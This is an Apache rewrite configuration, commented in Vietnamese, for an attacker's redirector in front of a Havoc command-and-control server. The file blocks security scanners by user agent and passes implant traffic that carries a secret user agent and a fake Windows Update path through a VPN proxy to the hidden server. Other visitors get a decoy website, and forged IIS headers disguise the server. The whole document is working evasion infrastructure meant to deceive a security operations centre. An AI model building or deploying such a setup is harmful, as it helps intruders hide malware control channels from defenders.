# ----------------------------------------------------------------------
# OPSEC REDIRECTOR: FRONTEND (10.8.0.1) -> HAVOC (10.8.0.2)
# ----------------------------------------------------------------------
RewriteEngine On

# [PHẦN 1] - BẨY MÁY QUÉT (SOC TOOLS)
# Nếu phát hiện User-Agent của máy quét, trả về 403 Forbidden ngay lập tức
RewriteCond %{HTTP_USER_AGENT} ^.*(nmap|nikto|nessus|qualys|acunetix|censys|shodan|zgrab|masscan).* [NC]
RewriteRule ^.*$ - [F,L]

# [PHẦN 2] - ĐỊNH DANH ATTACKER (SECRET KNOCK)
# 1. Kiểm tra User-Agent bí mật của Havoc Agent
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5.0\ \(Windows\ NT\ 10.0;\ Win64;\ x64\)\ Chrome/121.0.0.0 [NC]
# 2. Kiểm tra URI bí mật (Giả lập Windows Update)
RewriteCond %{REQUEST_URI} ^/msdownload/update/v3/static/.* [NC]

# [HÀNH ĐỘNG] - ĐẨY VÀO TUNNEL VPN TỚI HAVOC (10.8.0.2)
# Sử dụng Proxy [P] để giấu IP thật của Havoc phía sau
RewriteRule ^(.*)$ http://10.8.0.2:443/$1 [P,L]

# [PHẦN 3] - HIỂN THỊ FRONTEND CHO SOC (CLOAKING)
# Nếu không phải Attacker, hiển thị website giới thiệu (index.html) trong /var/www/html/
# Điều này khiến SOC tin rằng đây là một Web server thông thường
RewriteRule ^$ index.html [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.html [L]

# [PHẦN 4] - GIẢ MẠO FINGERPRINT
# Ép Header trả về giống hệt server Microsoft IIS 10.0
<IfModule mod_headers.c>
    Header unset X-Powered-By
    Header unset Server
    Header set Server "Microsoft-IIS/10.0"
</IfModule>
